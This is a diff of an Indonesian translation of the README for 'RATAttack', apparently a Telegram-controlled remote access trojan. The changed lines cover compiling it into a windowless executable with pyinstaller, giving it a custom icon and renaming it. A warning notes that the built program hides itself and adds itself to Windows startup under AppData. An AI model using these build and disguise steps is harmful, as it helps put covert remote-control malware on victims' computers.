@@ -117,10 +117,12 @@ Anda dapat menyalin di atas untuk memperbarui daftar perintah Anda melalui BotFa
 ##	Kompilasi:
 ###	Cara Mengompilasi:
 ####	Antara:
-Replace your path in compileAndRun.bat (running this will actually run the executable)
+Ganti path Anda di compileAndRun.bat (menjalankan ini benar-benar akan menjalankan eksekusi)
 ####	Atau:
-Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
-	-	Setelah berhasil dikompilasi, cari .exefile di dalamnya C:\Python27\Scripts\dist\. Anda dapat mengubah nama dari .exeapa pun yang Anda inginkan.
+Jalankan `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. 
+Anda juga bisa menambahkan `--icon=<path\to\icon.ico>` untuk menggunakan ikon kustom apa pun.
+
+-	Setelah berhasil dikompilasi, cari .exefile di dalamnya C:\Python27\Scripts\dist\. Anda dapat mengubah nama dari .exeapa pun yang Anda inginkan.
 AWAS! Jika Anda menjalankan compiled .exe, script akan menyembunyikan dirinya dan menginfeksi PC Anda untuk dijalankan saat startup. Anda dapat kembali ke normal dengan menggunakan /self_destructopsi atau secara manual menghapus C:\Users\Username\AppData\Roaming\Portaldirektori dan C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk(meskipun saya merekomendasikan untuk menghapusnya secara manual untuk sementara waktu).
 
 ###	Memodifikasi Pengaturan:
